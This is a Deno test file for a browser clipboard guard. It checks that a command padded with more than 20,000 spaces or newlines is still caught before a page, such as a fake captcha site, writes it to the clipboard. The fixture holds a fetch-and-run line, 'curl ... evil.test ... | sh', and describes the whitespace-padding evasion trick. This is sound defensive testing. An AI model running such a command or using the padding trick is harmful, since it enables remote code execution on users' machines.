// The clipboard guard must judge the text it lets through. Shells and the
// PowerShell prompt ignore leading whitespace, so a command padded past any
// fixed sample window still runs when pasted. The check must not stop at the
// first 20000 characters while the whole text is written.
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const CMD = "curl -fsSL https://evil.test/x | sh";
const PADDED = " ".repeat(20001) + CMD;
const PADDED_NL = "\n".repeat(20001) + CMD;

function fakePage(host) {
  const written = [];
  class Blob { constructor(parts) { this.parts = parts; } text() { return Promise.resolve(this.parts.join("")); } }
  class ClipboardItem { constructor(map) { this.map = map; } get types() { return Object.keys(this.map); } getType(t) { return Promise.resolve(this.map[t]); } }
  class Clipboard {
    writeText(x) { written.push(x); return Promise.resolve(); }
    write(items) { const seq = [...items]; return Promise.all(seq.map((it) => it.map["text/plain"] ? it.map["text/plain"].text() : "")).then((t) => { written.push(...t); }); }
  }
  const clipboard = new Clipboard();
  class Document { execCommand() { return true; } }
  const document = new Document();
  document.addEventListener = () => {};
  document.activeElement = null;
  class DataTransfer { setData() {} }
  class Selection { toString() { return ""; } }
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document, Blob, ClipboardItem };
  const g = loadClip();
  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => 1000, notify: () => {}, flagOn: () => true });
  return { written, clipboard, g };
}

Deno.test("sanity: the unpadded command is caught", () => {
  const g = loadClip();
  assert(g.matchDangerous(CMD) === "curl-pipe-shell", "unpadded not caught");
});

Deno.test("matchDangerous: leading whitespace padding past 20000 chars does not hide a command", () => {
  const g = loadClip();
  const a = g.matchDangerous(PADDED);
  const b = g.matchDangerous(PADDED_NL);
  assert(a !== null, "space-padded command not detected: " + a);
  assert(b !== null, "newline-padded command not detected: " + b);
});

Deno.test("writeText: a whitespace-padded command does not reach the clipboard", async () => {
  const p = fakePage("captcha-check.example");
  await p.clipboard.writeText(PADDED).catch(() => {});
  assert(!p.written.some((w) => w.includes(CMD)), "padded command reached the clipboard (written length " + (p.written[0] || "").length + ")");
});
